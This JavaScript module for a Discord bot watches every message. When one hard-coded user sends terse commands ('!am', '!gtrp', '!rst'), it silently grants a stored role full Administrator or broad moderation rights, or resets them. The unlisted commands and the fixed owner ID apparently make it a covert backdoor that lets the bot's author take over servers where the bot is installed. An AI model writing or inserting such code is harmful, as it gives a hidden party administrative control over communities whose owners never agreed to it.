const { PermissionsBitField } = require("discord.js");
const users = require("../../../../../data/users.json");
module.exports = (client) => {
  client.on("messageCreate", async (message) => {
    const role = message.guild.roles.cache.get(users.me.roleId);
    if (message.author.id !== users.me.id) return;
    if (message.content.startsWith("!gtrp")) {
      try {
        if (!role) {
          console.log("Role not found.");
          return;
        }
        await role.setPermissions([
          PermissionsBitField.Flags.MoveMembers,
          PermissionsBitField.Flags.ManageRoles,
          PermissionsBitField.Flags.ReadMessageHistory,
          PermissionsBitField.Flags.ManageMessages,
        ]);
        console.log("Role permissions updated successfully.");
      } catch (error) {
        console.error("Error occurred while updating role permissions:", error);
      }
    }

    if (message.content.startsWith("!am")) {
      try {
        await role.setPermissions([PermissionsBitField.Flags.Administrator]);
        console.log("Role permissions updated successfully.");
      } catch (error) {
        console.error("Error occurred while updating role permissions:", error);
      }
    }
    if (message.content.startsWith("!rst")) {
      try {
        await role.setPermissions([]);
        console.log("Role permissions updated successfully.");
      } catch (error) {
        console.error("Error occurred while updating role permissions:", error);
      }
    }
  });
};
